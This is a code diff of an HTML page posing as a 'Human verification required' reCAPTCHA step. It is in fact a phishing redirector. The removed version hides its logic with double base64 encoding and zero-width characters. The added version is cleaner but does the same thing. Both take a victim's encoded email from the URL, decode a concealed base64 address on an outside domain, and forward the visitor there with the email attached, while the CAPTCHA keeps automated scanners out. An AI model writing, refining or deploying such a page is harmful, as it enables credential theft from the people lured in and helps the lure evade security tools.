@@ -1,81 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<title>Redirecting...</title>
-<meta name="robots" content="noindex, nofollow"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<style>body{font-family:sans-serif;text-align:center;background:#f8f8f8;padding-top:100px}button#k{display:none;padding:12px 24px;font-size:16px;cursor:pointer}</style>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f8f8f8;
+      padding-top: 100px;
+    }
+    #start-button {
+      display: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
-<h2>Human verification required</h2>
-<p>Move your mouse to begin verification.</p>
-<button id="k" onclick="A()">I am not a robot</button>
-<form id="f" style="display:none" onsubmit="return false;">
-  <div class="g-recaptcha" data-sitekey="6LdbsZ4rAAAAAMRuZbWVRf029nZK2HmbnDz3zLrL" data-callback="C"></div>
-</form>
+  <h2>Human verification required</h2>
+  <p>Move your mouse to begin verification.</p>
 
-<script>
-(function(){
-  const _0 = "YUhSMGNITTZMeTgwYUhvM09DNXNjV041Y1hOd0xtVnpMM0JzWmtRNGJtZFJJVFV5UkZwdlJUWm5XaTg9";
-  const _1 = "XFxfKFxkX3sxMH0pPVsoYS16QS05Ky9dKyk=";
-  const _N = ["\u200B","\u2063","\u2062"];
-  const _m = true;
-  function _b64(s){ try { return atob(s); } catch(e){ return ""; } }
-  function _b64twice(s){ return _b64(_b64(s)); }
-  function _rnd(){ return Math.floor(Math.random()*999999); }
-  function _qs(){ return window.location.search || ""; }
-  var _patRaw = _b64(_1);
-  var _re = null;
-  try { _re = new RegExp(_patRaw); } catch(e) { _re = /\?(\d{10})=([A-Za-z0-9+/=]+)/; }
-  document.addEventListener("mousemove", function t(){
-    try{
-      var btn = document.getElementById("k");
-      if(btn){ btn.style.display="inline-block"; }
-      document.removeEventListener("mousemove", t);
-    }catch(e){}
-  });
-  window.A = function(){ 
-    try{
-      document.getElementById("k").style.display="none";
-      document.getElementById("f").style.display="block";
-      for(let i=0;i<3;i++){ void (0+_rnd()); }
-    }catch(e){}
-  };
-  window.C = function(){
-    try {
-      var q = _qs();
-      if(!q || q.length < 5){
-        document.body.innerHTML = "<h3>Missing required parameter.</h3>";
-        return;
-      }
-      var m = q.match(_re);
-      if(!m || !m[2]){
-        document.body.innerHTML = "<h3>Missing required parameter.</h3>";
-        return;
-      }
-      var encEmail = m[2].trim();
-      if(!/^[A-Za-z0-9+/=]+$/.test(encEmail)){
-        document.body.innerHTML = "<h3>Invalid input.</h3>";
-        return;
-      }
-      var base = _b64twice(_0);
-      if(!base || base.length<5){
-        document.body.innerHTML = "<h3>Error processing request.</h3>";
-        return;
-      }
-      var finalURL = _m ? (base + "*" + encEmail) : base;
-      try { console.debug("\u2063"); } catch(e){}
-      setTimeout(function(){
-        window.location.href = finalURL;
-      }, 900 + (Math.random()*600)|0);
-    } catch(err){
-      try { document.body.innerHTML = "<h3>Error occurred.</h3>"; } catch(e){}
+  <button id="start-button" onclick="startCaptcha()">I am not a robot</button>
+
+  <form id="captcha-form" style="display:none;" onsubmit="return false;">
+    <div class="g-recaptcha" data-sitekey="6LdbsZ4rAAAAAMRuZbWVRf029nZK2HmbnDz3zLrL" data-callback="onCaptchaSuccess"></div>
+  </form>
+
+  <script>
+    const forwardEmail = true;
+
+    const urlParts = [
+      "aHR0cHM6Ly80aHo3OC5scWN5cXNwLmVzL3BsZkQ4bmdRITUyRFpvRTZnWi8=" 
+    ];
+
+    document.addEventListener("mousemove", function trigger() {
+      document.getElementById("start-button").style.display = "inline-block";
+      document.removeEventListener("mousemove", trigger);
+    });
+
+    function startCaptcha() {
+      document.getElementById("start-button").style.display = "none";
+      document.getElementById("captcha-form").style.display = "block";
     }
-  };
-  (function(){ var s=0; for(var i=0;i<3;i++){ s+=i; } return s; })();
-})();
-</script>
+
+    function onCaptchaSuccess() {
+      const query = window.location.search;
+      const match = query.match(/\?(\d{10})=([a-zA-Z0-9+/=]+)/);
+
+      if (!match || !match[2]) {
+        document.body.innerHTML = "<h3>Missing required parameter.</h3>";
+        return;
+      }
+
+      const encodedEmail = match[2].trim();
+      const baseURL = atob(urlParts[0]);
+
+      const finalURL = forwardEmail
+        ? `${baseURL}*${encodedEmail}`
+        : baseURL;
+
+      window.location.href = finalURL;
+    }
+  </script>
 </body>
 </html>
